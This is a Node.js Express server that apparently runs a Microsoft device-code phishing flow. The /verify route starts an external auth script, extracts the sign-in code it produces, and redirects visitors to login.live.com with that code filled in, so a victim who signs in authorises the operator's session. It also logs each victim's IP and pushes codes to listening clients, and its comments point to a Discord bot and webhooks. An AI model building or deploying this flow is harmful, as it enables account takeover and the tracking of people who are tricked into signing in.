const express = require('express');
const crypto = require('crypto');
const { spawn } = require('child_process');
const { Worker } = require('worker_threads');

const app = express();
const port = 3001;

app.use(express.json()); // Enable JSON request body parsing

const cacheDir = 'random';
let authenticationCode = null;
let clients = [];

// Your Discord bot code here (see the previous code for the bot setup)

function doAuth(username, clientIP) {
  const childProcess = spawn('node', ['authProcess.js', username, cacheDir]);
  const logBuffer = [];

  childProcess.stdout.on('data', (data) => {
    const output = data.toString();
    logBuffer.push(output);

    const codeMatch = output.match(/enter the code ([A-Z0-9]{8})/i);
    if (codeMatch && codeMatch[1]) {
      authenticationCode = codeMatch[1];
      console.log('Authentication code:', authenticationCode);

      // Notify connected clients when the authentication code is available
      clients.forEach((client) => {
        client.res.write(`data: ${authenticationCode}\n\n`);
        client.res.end();
      });
    }
  });

  childProcess.stderr.on('data', (data) => {
    const errorOutput = data.toString();
    logBuffer.push(errorOutput);
    console.error(errorOutput);
  });

  childProcess.on('close', (code) => {
    console.log(`Child process exited with code ${code}`);

    // Offload the log-saving task to a worker thread
    if (authenticationCode) {
      const logWorker = new Worker('./logWorker.js', {
        workerData: { authenticationCode, logBuffer, clientIP },
      });

      logWorker.on('message', (message) => {
        if (message.error) {
          console.error('Error saving log:', message.error);
        } else {
          console.log('Log saved to:', message.logFilePath);
        }
      });
    }
  });
}



// Add an API endpoint for generating webhook URLs

app.get('/stream', (req, res) => {
  // Enable server-sent events (SSE) for clients
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  // Keep track of connected clients
  clients.push({ req, res });
});

app.get('/verify', (req, res) => {
  const clientIP = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();

  const username = crypto.randomBytes(8).toString('hex');
  doAuth(username, clientIP);

  const intervalId = setInterval(() => {
    if (authenticationCode) {
      clearInterval(intervalId);
      const redirectUrl = `https://login.live.com/oauth20_remoteconnect.srf?lc=1033&otc=${authenticationCode}`;
      res.redirect(redirectUrl);
    }
  }, 1000); // Poll every second
});








app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
